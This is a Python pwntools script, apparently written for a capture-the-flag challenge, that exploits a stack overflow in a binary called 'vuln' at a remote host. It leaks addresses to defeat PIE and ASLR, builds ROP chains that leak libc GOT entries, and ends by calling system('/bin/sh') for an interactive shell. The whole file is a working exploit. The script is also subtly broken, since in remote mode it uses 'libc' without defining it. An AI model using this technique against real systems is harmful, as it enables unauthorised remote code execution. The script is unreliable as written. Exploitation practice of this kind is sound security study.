from pwn import *
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb
context.terminal = ['tmux','splitw','-v']
context.update(os='linux')
filename = './vuln'
elf = ELF(filename)
host = 'spclr.ch'
port = 1260
local = False
debug = False
ropper = rop.ROP(elf)
pop_rdi_gadget = ropper.find_gadget(['pop rdi','ret'])[0]
ret_gadget = ropper.find_gadget(['ret'])[0]
got_puts = elf.sym['got.puts']
got_printf = elf.sym['got.printf']
plt_puts = elf.sym['puts']

def ropchain(p=None,chain=[]):
    padding = 46 + len(chain) - 1
    p.sendline(b'-1')
    p.recvuntil(b':')
    p.sendline(str(padding).encode())
    p.recvuntil(b':')
    for e in chain[::-1]:
        p.sendline(str(e).encode())
        p.recvuntil(b':')
    p.sendline(b'-')
    for i in range(padding-len(chain)-1):
        p.sendline(b'-')
        p.recvuntil(b': ')
try:
    p = elf.process() if local else remote(host,port)
    p.recvuntil(b':')
    leaked_main = int(p.recvline().rstrip()[3:],16)
    elf.address = leaked_main - elf.sym['main']
    plt_puts_addrl = elf.plt.puts
    got_puts_addrl = elf.got.puts
    got_printf_addrl = elf.got.printf
    pop_rdi_addrl = elf.address + pop_rdi_gadget
    ret_addrl = elf.address + ret_gadget
    print(f'puts@plt={hex(plt_puts_addrl)}')
    print(f'puts@got={hex(got_puts_addrl)}')
    print(f'ret gadget={hex(ret_addrl)}')
    print(f'pop rdi gadget={hex(pop_rdi_addrl)}')
    chain1 = [
            pop_rdi_addrl, 
            got_puts_addrl,
            plt_puts_addrl,
            pop_rdi_addrl,
            got_printf_addrl, 
            plt_puts_addrl,
            ret_addrl, 
            elf.sym.main
    ]
    ropchain(p=p,chain=chain1)
    print(f'chain1 complete')
    leaked_puts = btl(p.recvline().rstrip()[::-1])
    print(f'{leaked_puts=}')
    leaked_printf =  btl(p.recvline().rstrip()[::-1])
    print(f'{leaked_printf=}')
    if local:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc.address = leaked_puts - libc.sym['puts']
    binsh_addr = [e for e in libc.search(b"/bin/sh\0")][0]
    system_addr = libc.sym['system']
    chain2 = [
            pop_rdi_addrl,
            binsh_addr,
            system_addr
        ]
    ropchain(p=p,chain=chain2)
    p.interactive()
except Exception as e:
    print(f'Exception: {e}')
